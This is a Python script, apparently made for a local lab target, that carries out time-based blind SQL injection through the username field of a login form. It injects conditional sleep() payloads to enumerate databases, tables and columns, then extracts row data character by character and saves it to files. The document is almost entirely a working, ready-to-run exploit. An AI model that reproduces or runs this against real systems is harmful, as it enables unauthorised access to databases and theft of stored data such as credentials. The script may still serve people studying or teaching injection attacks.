from pwn import *
import requests, signal, time, string

all_chars = string.ascii_lowercase + string.digits + string.punctuation

payload_bar = log.progress("Payload")

def stop(sig=False, frame=False):
	log.warn("QUITTING...")
	sys.exit(1)

signal.signal(signal.SIGINT, stop)

def send_request(payload):
	target = "http://172.17.0.2/db.php"

	send = {
		"username": f"admin' {payload}",
		"password": "test"
	}

	start = time.time()

	response = requests.post(url=target, data=send, allow_redirects=False)

	end = time.time()

	final = end - start

	if final >= 1: return True


def enum_databases():
	base_bar = log.progress("Enumerating...")

	num_dbs = 0
	total_dbs = []

	for num in range(100):
		payload = f'or if((select count(schema_name) from information_schema.schemata)={num},sleep(0.1),1)-- -'

		payload_bar.status(f"Databases: {num}")

		if send_request(payload):
			num_dbs = num
			print()
			log.info(f"Total databases found: {num}")
			break

	print()
	for database in range(num_dbs):
		for num in range(1000):
			payload = f"or if(length((select schema_name from information_schema.schemata limit {database},1))={num},sleep(0.1),1)-- -"

			payload_bar.status(f"Getting the length from the database: {database}")

			if send_request(payload):
				total_dbs.append({"database": database, "length": num})
				log.info(f"The length of the database {database} is: {num}")
				break

	print("\n" + "-"*10 + "DATABASES" + "-"*10 + "\n")
	for db in total_dbs:
		actual_db = db["database"]
		length = db["length"] + 1

		database = ""

		for num in range(length):
			for char in all_chars:
				payload = f"or if(substr((select schema_name from information_schema.schemata limit {actual_db},1),{num},1)='{char}',sleep(0.1),1)-- -"

				payload_bar.status(payload)

				if send_request(payload):
					database += char
					base_bar.status(f"Database {actual_db}: {database}")
					break

		log.warn(f"Database: {database}")

	base_bar.success("All the databases has been obtained!")


def enum_tables(database):
	table_bar = log.progress("Enumerating...")

	num_tbs = 0
	total_tbs = []

	for num in range(100):
		payload = f"or if((select count(*) from information_schema.tables where table_schema='{database}')={num},sleep(0.1),1)-- -"

		payload_bar.status(f"Tables: {num}")

		if send_request(payload):
			num_tbs = num
			print()
			log.info(f"Tables in total: {num}")
			break

	print()
	for table in range(num_tbs):
		for num in range(1000):
			payload = f"or if(length((select table_name from information_schema.tables where table_schema='{database}' limit {table},1))={num},sleep(0.1),1)-- -"

			payload_bar.status(f"Getting the length from the table: {table}")

			if send_request(payload):
				total_tbs.append({"table": table, "length": num})
				log.info(f"The length of the table {table} is: {num}")
				break

	print("\n" + "-"*10 + "TABLES" + "-"*10 + "\n")
	for tb in total_tbs:
		actual_tb = tb["table"]
		length = tb["length"] + 1

		table = ""

		for num in range(length):
			for char in all_chars:
				payload = f"or if(substr((select table_name from information_schema.tables where table_schema='{database}' limit {actual_tb},1),{num},1)='{char}',sleep(0.1),1)-- -"

				payload_bar.status(payload)

				if send_request(payload):
					table += char
					table_bar.status(f"Table {actual_tb}: {table}")
					break

		log.warn(f"Table: {table}")

	table_bar.success("All the tables are obtained!")


def enum_columns(table):
	column_bar = log.progress("Enumerating...")

	num_cms = 0
	total_cms = []

	for num in range(100):
		payload = f"or if((select count(column_name) from information_schema.columns where table_name='{table}')={num},sleep(0.1),1)-- -"

		payload_bar.status(f"Columns {num}")

		if send_request(payload):
			num_cms = num
			print()
			log.info(f"Columns in total: {num}")
			break

	print()
	for column in range(num_cms):
		for num in range(1000):
			payload = f"or if(length((select column_name from information_schema.columns where table_name='{table}' limit {column},1))={num},sleep(0.1),1)-- -"

			payload_bar.status(f"Getting the length from the column {column}")

			if send_request(payload):
				total_cms.append({"column": column, "length": num})
				log.info(f"The length of the column {column} is: {num}")
				break

	print("\n" + "-"*10 + "COLUMNS" + "-"*10 + "\n")
	for cm in total_cms:
		actual_cm = cm["column"]
		length = cm["length"] + 1

		column = ""

		for num in range(length):
			for char in all_chars:
				payload = f"or if(substr((select column_name from information_schema.columns where table_name='{table}' limit {actual_cm},1),{num},1)='{char}',sleep(0.1),1)-- -"

				payload_bar.status(payload)

				if send_request(payload):
					column += char
					column_bar.status(f"Column {actual_cm}: {column}")
					break

		log.warn(f"Column: {column}")

	column_bar.success("All the columns are obtained!")


def get_data(database,table,columns):
	data_bar = log.progress("Getting data...")

	num_rows = 0
	total_rows = []
	results = {}

	rand_cm = columns[0]

	for num in range(100000):
		payload = f"or if((select count({rand_cm}) from {database}.{table})={num},sleep(0.1),1)-- -"

		payload_bar.status(f"Rows: {num}")

		if send_request(payload):
			num_rows = num
			print()
			log.info(f"Rows in total {num}")
			break

	print()
	for column in columns:
		for row in range(num_rows):
			for num in range(100000):
				payload = f"or if(length((select {column} from {database}.{table} limit {row},1))={num},sleep(0.1),1)-- -"

				payload_bar.status(f"Getting the length of the row {row} from the column {column}")

				if send_request(payload):
					total_rows.append({"column": column, "row": row, "length": num})
					log.info(f"The length of the row {row} from the column {column} is: {num}")
					break

	print("\n" + "-"*10 + "DATA" + "-"*10 + "\n")
	for rw in total_rows:
		actual_column = rw["column"]
		actual_row = rw["row"]
		length = rw["length"] + 1

		result = ""

		for num in range(length):
			for char in all_chars:
				payload = f"or if(substr((select {actual_column} from {database}.{table} limit {actual_row},1),{num},1)='{char}',sleep(0.1),1)-- -"

				payload_bar.status(payload)

				if send_request(payload):
					result += char
					data_bar.status(f"Row {actual_row}: {result}")
					break

		log.warn(f"Row {actual_row}: {result}")
		with open(f"results_column_{actual_column}", "a") as file: file.write(f"\n{result}")

		if not actual_row in results:
			results[actual_row] = []

		results[actual_row].append(result)

	print()
	for row, values in results.items():
		funny = ":".join(values)
		log.warn(f"Row {row} -> {funny}")


def execute():
	enum_databases()

	select_db = str(input(f"\n[i] Select a database: ")).strip()
	if not select_db: stop()

	enum_tables(select_db)

	select_tb = str(input(f"\n[i] Select a table: ")).strip()
	if not select_tb: stop()

	enum_columns(select_tb)

	select_cl = str(input(f"\n[i] Select the columns: ")).strip()

	columns = select_cl.split(",")

	get_data(select_db,select_tb,columns)

if __name__ == "__main__":
	execute()
